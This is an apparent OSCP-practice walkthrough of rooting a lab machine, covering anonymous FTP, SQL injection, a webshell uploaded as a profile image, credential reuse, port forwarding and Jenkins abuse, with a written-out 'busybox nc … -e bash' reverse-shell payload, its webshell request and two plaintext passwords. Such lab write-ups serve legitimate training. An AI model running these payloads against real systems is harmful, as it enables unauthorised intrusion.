@@ -1,0 +1,256 @@
+**Start 11:33 07-02-2025**
+
+---
+```
+Scope:
+IP_ADDR
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -vvvv -Pn -p- vmdak -sT --min-rate=5000 -T5
+
+PORT     STATE SERVICE  REASON  VERSION
+21/tcp   open  ftp      syn-ack vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0            1752 Sep 19 15:01 config.xml
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.228
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh      syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMeGcI7LXAgYpdcxsbgmDh+FrFwBJxUEPxSU4XODxVs1CWLxFnxl1/SZ0ReciCentljLQxi9LqNYvR//3y6kAms=
+|   256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILE9A0DdfM97fpb5q8N9nmI/9/8rqT8ADRWK8KBegxYM
+80/tcp   open  http     syn-ack Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-title: Apache2 Ubuntu Default Page: It works
+9443/tcp open  ssl/http syn-ack Apache httpd 2.4.58
+| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US/organizationalUnitName=PrisonManagement/localityName=San Francisco
+| Subject Alternative Name: DNS:vmdak.local
+|_http-title:  Home - Prison Management System
+```
+
+Starting off with FTP I was able to anon login and get a file.
+
+![](../../../assets/aa0ad39cfbf367f12d17c78f7b5159e1.png)
+
+![](../../../assets/2dcfa0466ead5d86789a7b87e5c07552.png)
+
+
+# 9443/TCP - HTTPS
+
+![](../../../assets/74df86b8cc448b7e85bac9ac06c58c84.png)
+
+Looking it up I found a SQLi vulnerability
+
+![](../../../assets/1f88819091181ea1e92e0d5c3d7ab4ab.png)
+
+![](../../../assets/ccae6971cf267d347f26d0bf25e692c0.png)
+
+![](../../../assets/01549128f5d486b2191b34947ebb40c6.png)
+
+![](../../../assets/8e819d89fb6bcd51945e36a6db492a05.png)
+
+Nice, let's enumerate the website and see what we can find.
+
+>[!note]
+>For persistence we got the creds here:
+>![](../../../assets/d9bdecbfbe30474585a3fd8f7ffc5f88.png)
+
+![](../../../assets/fbb9afee5fb00ad1d4257b1406d3e291.png)
+
+```
+RonnyCache001
+```
+
+We notice that we can change our profile photo as well
+
+![](../../../assets/da57d598eca8198dbacc8f98f1dbace9.png)
+
+And looking up further exploits online we find [this blog post](https://packetstorm.news/files/id/179737) mentioning using the jpeg upload to upload rev shells.
+
+![](../../../assets/cd5aaad84b9a598bec139aef7a3b0ac5.png)
+
+
+## Burpsuite
+
+>[!note]
+>We will now open up `burpsuite` where we will turn *ON* Intercept so we can modify the Request.
+
+And in Burp we get this Request.
+
+![](../../../assets/5d2a9f8760915a51cb4eeaea14d270b8.png)
+
+Here we will modify the bottom part to this:
+
+![](../../../assets/495260cea437b978f5f9721c696e1aa6.png)
+
+If all went correct we should see the following pop up in our **HTTP history** tab
+
+![](../../../assets/fd4bca4e454ce415b391483a564a86f9.png)
+
+Let's test out if it worked:
+
+![](../../../assets/2dd6cf5ee6e748e75e7e6a9cd2ae05c3.png)
+
+Awesome, let's start modifying the request so we can get a reverse shell.
+
+
+# Foothold
+
+```bash
+# Original payload
+busybox nc 192.168.45.228 443 -e bash
+
+# Url encoded
+/uploadImage/Profile/cmd.php?cmd=busybox%20nc%20192.168.45.228%20443%20-e%20bash
+```
+
+![](../../../assets/db4ca6cb5956c772948458421f8268be.png)
+
+![](../../../assets/a1b32c19e49c1d325ba31c83f3731dcb.png)
+
+Now that we have RCE we can get to enumerating.
+
+
+## Enumeration
+
+![](../../../assets/cb7d56e9324cfa5b06ab5240ab388781.png)
+
+![](../../../assets/d596e21ec3416b801c180df04ab08551.png)
+
+![](../../../assets/3e053bf4cf69532733bb7b8e44ca784e.png)
+
+```
+escobar2012
+```
+
+
+## Lateral Movement
+
+I tried out both found creds for the user *vmdak* and the first one worked:
+
+![](../../../assets/9385f447d89153b41de5cdd1d0b6b352.png)
+
+![](../../../assets/5d1bf5cba7b401bfe5822f9c214b9359.png)
+
+Unfortunately `sudo -l` won't be possible.
+
+
+### local.txt
+
+![](../../../assets/1fe6d80bebecd068149b749b14780bb4.png)
+
+
+# Privilege Escalation
+
+We will start over by downloading over necessary tools.
+
+![](../../../assets/c342b52aeeecd6763111b868b9cc47a3.png)
+
+
+## LinPEAS
+
+I didn't find anything useful except this line:
+
+![](../../../assets/504e71d31f9f821e94ae4f0c8ca6e26d.png)
+
+We should try port forwarding and see what we can find.
+
+
+## Ligolo port forward
+
+![](../../../assets/74f64f5ec9bbc44b25d5f117e0f616e9.png)
+
+![](../../../assets/2de73e895281d3c943a76bc7b9598f07.png)
+
+![](../../../assets/9b4e49f0ec107d3a09c8de67eedfb2c6.png)
+
+Now that the port forward has been setup we can access port `8080`.
+
+
+## 8080/TCP - HTTP (Port Forward)
+
+![](../../../assets/9568a3fd7fbe17fe901c673fdc4c4149.png)
+
+![](../../../assets/ccfe3aae945d562f46e00a88c8bb5962.png)
+
+![](../../../assets/70e1e511ec8e75fa067fbe03079741c9.png)
+
+Since this didn't work I had to look for other means.
+
+
+## Arbitrary File Read PoC
+
+I searched on Google and found the following:
+
+![](../../../assets/0d9dc47f1277accc1d068a41692ad269.png)
+
+![](../../../assets/0151e32a5fd5e5ec6327ad413b8ac10f.png)
+
+![](../../../assets/4c0c6af81f345e26023c44fbb54199ab.png)
+
+It worked, awesome. Let's try the file that we need:
+
+![](../../../assets/174df927e660d003ba3013e6f42c1183.png)
+
+Using this password we get through:
+
+![](../../../assets/fc0ded11a084af920d0962e5070547ae.png)
+
+![](../../../assets/5e5dce5e5d886ce319021fcd83c9c5fd.png)
+
+Here I created a **New Item** called **test**:
+
+![](../../../assets/fa17513972cf9d548b9f35d6e855a4b6.png)
+
+From here we go into **Configuration -> General -> Build Steps** where we will choose **Execute Shell**
+
+![](../../../assets/5a56ae1dade2a561a42f97e0a299b655.png)
+
+![](../../../assets/768b26ca9e356299601320997dd0da38.png)
+
+We will then click **Build Now** and let it run, after a while we should receive our `root` shell.
+
+![](../../../assets/d001b951fd71f4fed0454e850a6f756b.png)
+
+>[!fail]
+>This threw errors as it couldn't reach me, thus I had to add a listener on Ligolo first.
+>![](../../../assets/6a815c2f30707b888c3c0b789ea4b12c.png)
+
+![](../../../assets/adc0e36001094b453a79ee7f62516217.png)
+
+![](../../../assets/8a224145a95f06e2c3888dffe2f36128.png)
+
+![](../../../assets/3e7c1e4e8282b82b47bc89ca079cec5b.png)
+
+Now it went through the way it should!
+
+
+### proof.txt
+
+![](../../../assets/e55d47776a73f45ace33890e6b40050b.png)
+
+---
+
+**Finished 12:54 07-02-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#Jenkins 
